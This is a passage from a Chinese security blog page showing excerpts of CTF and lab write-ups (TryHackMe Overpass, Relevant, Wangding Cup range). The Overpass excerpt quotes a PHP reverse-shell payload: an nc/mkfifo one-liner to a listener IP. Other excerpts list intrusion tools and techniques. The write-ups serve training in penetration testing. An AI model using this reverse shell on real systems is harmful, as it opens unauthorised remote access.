Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么？流量包中可以看到是development  ‍ payload 1&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;  密码在tcp流3中  发现使用了ssh-backdoor  1git clone...</div></div></div></a><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a><a class="pagination-related" href="/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html" title="2022网鼎杯决赛内网靶场复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="info-item-2">2022网鼎杯决赛内网靶场复现</div></div><div class="info-2"><div class="info-item-1">2022网鼎杯决赛内网靶场复现工具 目录扫描工具[[dirsreach]]，[[gobuster]] , antsword，godzilla，[[fscan]]，[[WPScan]]，[[chisel]]，[[frp]]，[[Proxifier]] , [[msf]]，[[WMIexec]]，rdp是什么，[[CrackMapExec]] 复现 靶标介绍：该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。 考点：  wordpress插件rce MS17-010 AS-REP Roasting 基于资源的约束性委派 智能卡身份验证出错下的CVE-2022–26923 AD域提权打法——Schannel传递证书传递到LDAPS，修改LDAP配置RBCD  渗透的过程  外网打点  -&gt;...</div></div></div></a><a class="pagination-related" href="/post/the-shooting-range-that-i-accidentally-discovered-during-a-mysterious-group-chat-bwhwi.html" title="水群看见的靶场，打一打"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">水群看见的靶场，打一打</div></div><div class="info-2"><div class="info-item-1">水群看见的靶场，打一打 地址：http://111.119.241.115:10088/ 开放一个靶机，靶机每30分钟重置一次  你需要完成信息收集，拿到初次的一些信息来完成后续的漏洞攻击 你需要找到第二个漏洞来获取第三个高危漏洞 恭喜你获取到了第三个漏洞点，不过值得烧脑的是这个获取shell不是很容易 历经千辛万苦，你获取到了shell，但是需要查看根目录下的flag还是有难度的，你需要根据常用的提权方式和主机的信息泄露获取到后面的一些权限 恭喜你获取到了权限，但还不是root，仔细看看怎么样获取到flag文件？  环境为仿真自建，不针对其他cms，漏洞思路来源于当前现实生活，思路比较新，有一些ctf烧脑，难度适中#渗透测试 #CTF #提权  ‍ 直接给的ip+端口号，可以忽略扫端口那一整块。直接扫目录 ​​ ​​ 扫到了一个database.sql​文件，down下来，审计发现： 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS `admins`;/*!40101 SET...</div></div></div></a><a class="pagination-related" href="/post/ccb-z184yjw.html" title="ccb&amp;ciscn线下半决赛 - wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ccb&amp;ciscn线下半决赛 - wp</div></div><div class="info-2"><div class="info-item-1">ccb&amp;ciscn线下半决赛 - wp 有幸拿到一等奖  awdpphp-master 导入 12345# docker 导入docker load -i xxx.tar# 不知道端口的情况下运行该镜像docker run -it &lt;images&gt; /bin/bash  查看运行端口，发现就是80，那就可以用以下命令运行docker 123docker run -d -p 4545:80 &lt;images&gt; # 进入容器docker exec -it &lt;container&gt; /bin/bash  ‍ 在容器中找到index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php@error_reporting(E_ALL);if...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">symv1a</div><div class="author-info-description">随便写写，随缘更新</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/symya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/symya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:symv1a@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THM-Offensive-Pentesting-Section2-Skynet"><span class="toc-number">1.</span> <span class="toc-text">THM - Offensive Pentesting - Section2 - Skynet</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A"><span class="toc-number">2.1.</span> <span class="toc-text">nmap扫描报告</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.</span> <span class="toc-text">gobuster扫目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMBMap%E6%9E%9A%E4%B8%BEsanba%E5%85%B1%E4%BA%AB%E6%9C%BA"><span class="toc-number">2.3.</span> <span class="toc-text">SMBMap枚举sanba共享机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.4.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-milesdyson-%E5%85%B1%E4%BA%AB"><span class="toc-number">2.5.</span> <span class="toc-text">访问 milesdyson 共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cuppacms-nday"><span class="toc-number">2.6.</span> <span class="toc-text">cuppacms nday</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve202551482-letta-ai-component-code-injection-leads-to-rce-zxwmhs.html" title="CVE-2025-51482 Letta AI 组件代码注入导致RCE">CVE-2025-51482 Letta AI 组件代码注入导致RCE</a><time datetime="2026-01-07T10:40:09.000Z" title="Created 2026-01-07 10:40:09">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve20253248-z2i1g0l.html" title="CVE-2025-3248">CVE-2025-3248</a><time datetime="2026-01-05T09:56:35.000Z" title="Created 2026-01-05 09:56:35">2026-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/basic-use-of-suricata-23gslt.html" title="suricata基本使用">suricata基本使用</a><time datetime="2025-12-26T16:37:21.000Z" title="Created 2025-12-26 16:37:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程">MAC+IDA Pro9.2+MCP+Trae配置教程</a><time datetime="2025-12-24T09:44:55.000Z" title="Created 2025-12-24 09:44:55">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp">2025RCTF wp</a><time datetime="2025-11-20T15:51:03.000Z" title="Created 2025-11-20 15:51:03">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By symv1a</span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://symya.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: '',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
